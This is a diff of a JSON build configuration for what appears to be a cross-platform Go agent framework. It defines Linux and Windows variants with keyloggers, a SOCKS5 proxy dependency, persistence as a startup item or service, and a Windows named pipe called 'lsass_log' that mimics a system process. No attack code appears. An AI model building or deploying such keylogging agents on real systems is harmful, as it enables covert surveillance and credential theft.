@@ -1,7 +1,8 @@
 {
     "linux/privileged": {
-        "type": "Linux With Keylogger",
-        "description": "requires root",
+        "type": "Linux Keylogger",
+        "description": "Must run as root. Keylogger without automatic processing.",
+        "os": "linux",
         "code_path": "linux/privileged/client.go",
         "flags": "-trimpath -ldflags",
         "environment": "CGO_ENABLED=0",
@@ -11,9 +12,22 @@
         ]
     },
     "linux/keylogger-v2": {
-        "type": "Linux With Keylogger v2",
-        "description": "requires root",
+        "type": "Linux Keylogger v2",
+        "description": "Must run as root. Keylogger with automatic processing.",
+        "os": "linux",
         "code_path": "linux/keylogger-v2/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "CGO_ENABLED=0",
+        "file_suffix": "",
+        "dependencies":[
+            "github.com/armon/go-socks5"
+        ]
+    },
+    "linux/socket-listener": {
+        "type": "Linux Socket Listener",
+        "description": "Requires root, has a socket at /var/run/log.sock for custom logs sent in UTF-8 format. Comes with the Linux Keylogger v2.",
+        "os": "linux",
+        "code_path": "linux/socket-listener/client.go",
         "flags": "-trimpath -ldflags",
         "environment": "CGO_ENABLED=0",
         "file_suffix": "",
@@ -23,7 +37,8 @@
     },
     "linux/unprivileged": {
         "type": "Linux Original",
-        "description": "linux unprivileged",
+        "description": "Can run as any user. Does not have any keylogger.",
+        "os": "linux",
         "code_path": "linux/unprivileged/client.go",
         "flags": "-trimpath -ldflags",
         "environment": "CGO_ENABLED=0",
@@ -34,7 +49,8 @@
     },
     "windows/unprivileged": {
         "type": "Windows Original",
-        "description": "windows unprivileged",
+        "description": "Can run as any user. Does not have any keylogger.",
+        "os": "windows",
         "code_path": "windows/unprivileged/client.go",
         "flags": "-trimpath -ldflags",
         "environment": "GOOS=windows GOARCH=amd64 CGO_ENABLED=0",
@@ -46,7 +62,8 @@
     },
     "windows/privileged": {
         "type": "Windows Keylogger",
-        "description": "windows keylogger",
+        "description": "Can run as any user. Has a userland keylogger. Recommended to use this as a startup item.",
+        "os": "windows",
         "code_path": "windows/privileged/client.go",
         "flags": "-trimpath -ldflags",
         "environment": "GOOS=windows GOARCH=amd64 CGO_ENABLED=0",
@@ -55,6 +72,21 @@
             "github.com/TheTitanrain/w32",
             "github.com/kardianos/service",
             "github.com/armon/go-socks5"
+        ]
+    },
+    "windows/named-pipe": {
+        "type": "Windows Named pipe",
+        "description": "Windows agent with keylogger and named pipe at \\.\\pipe\\lsass_log for custom logs sent in UTF-8 format. Recommended to run this as as service.",
+        "os": "windows",
+        "code_path": "windows/named-pipe/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "GOOS=windows GOARCH=amd64 CGO_ENABLED=0",
+        "file_suffix": ".exe",
+        "dependencies": [
+            "github.com/TheTitanrain/w32",
+            "github.com/kardianos/service",
+            "github.com/armon/go-socks5",
+            "github.com/Microsoft/go-winio"
         ]
     }
 }
